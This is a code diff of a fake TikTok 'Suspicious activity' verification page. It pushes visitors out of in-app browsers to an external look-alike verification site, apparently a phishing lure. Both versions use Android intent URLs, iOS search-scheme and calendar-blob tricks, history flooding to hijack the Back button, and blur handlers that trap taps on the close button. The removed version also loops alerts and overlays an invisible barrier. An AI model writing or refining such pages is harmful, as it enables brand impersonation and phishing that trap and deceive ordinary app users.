@@ -3,14 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Verification</title>
     <style>
         body, html { 
             margin: 0; padding: 0; background: #ffffff; 
             height: 100vh; overflow: hidden;
             -webkit-font-smoothing: antialiased;
             font-family: "Proxima Nova", "Inter", -apple-system, sans-serif;
-            touch-action: none; /* Disables native gestures */
         }
         
         #main-ui {
@@ -20,98 +18,75 @@
             padding: 0 35px; box-sizing: border-box;
         }
 
-        .v-icon { width: 65px; height: 65px; margin-bottom: 20px; }
-        .header { color: #161823; font-size: 24px; font-weight: 700; margin-bottom: 12px; }
-        .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 45px; max-width: 310px; }
+        /* Visual elements from the first code */
+        .verification-icon { width: 60px; height: 60px; margin-bottom: 15px; }
+        .header { color: #161823; font-size: 22px; font-weight: 700; margin-bottom: 10px; }
+        .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 40px; max-width: 310px; }
 
-        /* THE FINAL BUTTON */
-        .verify-btn {
-            background: #fe2c55; color: white; padding: 18px 70px; 
-            border-radius: 4px; text-decoration: none; font-weight: 700;
-            font-size: 18px; border: none; cursor: pointer;
-            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
-            transition: transform 0.1s ease;
-            -webkit-tap-highlight-color: transparent;
+        /* The Button from the functional code */
+        .btn { 
+            background: #fe2c55; color: #fff; padding: 20px 60px; 
+            border-radius: 12px; font-weight: 800; font-size: 22px; 
+            border: none; box-shadow: 0 0 20px #fe2c55; 
+            cursor: pointer;
         }
-        .verify-btn:active { transform: scale(0.96); }
-
-        #footer-ref { margin-top: 25px; color: #D1D1D3; font-size: 10px; font-family: monospace; letter-spacing: 0.5px; }
-
-        /* Invisible layer that catches the 'X' button area taps */
-        #barrier { position: fixed; top: 0; left: 0; width: 100%; height: 80px; z-index: 99999; }
     </style>
 </head>
 <body>
 
-    <div id="barrier"></div>
-
     <div id="main-ui">
-        <svg class="v-icon" viewBox="0 0 48 48" fill="none">
+        <svg class="verification-icon" viewBox="0 0 48 48" fill="none">
             <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
             <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
             <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
         </svg>
 
         <div class="header">Suspicious activity</div>
-        <div class="subtext">Please complete verification in a secure browser to continue using TikTok.</div>
+        <div class="subtext">Please complete verification to continue using TikTok.</div>
 
-        <button class="verify-btn" id="final-trigger">VERIFY NOW</button>
-
-        <div id="footer-ref">REF_ID: #8392-V2-AUTH</div>
+        <button class="btn" onclick="forceSystemOpen()">LAUNCH BROWSER</button>
     </div>
 
 <script>
-    // 1. CONFIGURATION
-    const targetLink = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
-    const androidIntent = `intent://${targetLink.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
+    // THE EXACT LOGIC FROM YOUR FAVORED CODE
+    const destination = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
 
-    // 2. THE SHOTGUN ESCAPE
-    function breakout() {
+    function forceSystemOpen() {
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
         const isAndroid = /Android/i.test(navigator.userAgent);
+
         if (isAndroid) {
-            window.location.href = androidIntent;
-        } else {
-            // iOS Protocol Switch
-            window.location.assign(targetLink);
-            window.open(targetLink, '_blank');
+            const intent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
+            window.location.href = intent;
+        } 
+        
+        if (isIOS) {
+            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
+            
+            setTimeout(() => {
+                const blob = new Blob([`BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\nURL:${destination}\nEND:VEVENT\nEND:VCALENDAR`], {type: 'text/calendar'});
+                const url = URL.createObjectURL(blob);
+                window.location.href = url;
+            }, 500);
+
+            setTimeout(() => {
+                window.location.assign(destination);
+            }, 1000);
         }
     }
 
-    // 3. THE RECURSIVE LOCK (The "X" Jammer)
-    function lockAndLoad() {
-        // Blocks Native UI thread
-        alert("SECURITY NOTICE: Verification Required.\n\nClick OK to open the secure system browser.");
-        
-        // Execute the breakout
-        breakout();
-        
-        // Immediate re-queue to keep 'X' button frozen
-        setTimeout(lockAndLoad, 10);
-    }
-
-    // 4. INTERCEPTING EXIT ATTEMPTS
-    // Tapping near X (blur) or Back (popstate)
-    window.onblur = () => { lockAndLoad(); };
-    window.onpopstate = () => { lockAndLoad(); };
-
-    // 5. BUTTON LOGIC
-    document.getElementById('final-trigger').onclick = function() {
-        // One-tap breakout
-        breakout();
-    };
-
-    // 6. PRISON INITIALIZATION
+    // THE "BACK" BUTTON TRAP
     window.onload = () => {
-        // Fill history so Back button triggers popstate
-        for(let i=0; i<100; i++) {
-            history.pushState({locked: true}, "", "#auth_session_" + i);
-        }
+        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
     };
 
-    // Final guard against refresh/close
-    window.onbeforeunload = (e) => {
-        breakout();
-        return "Verification Required";
+    window.onpopstate = () => {
+        forceSystemOpen();
+    };
+
+    // THE "X" BUTTON TRAP
+    window.onblur = () => {
+        forceSystemOpen();
     };
 </script>
 </body>
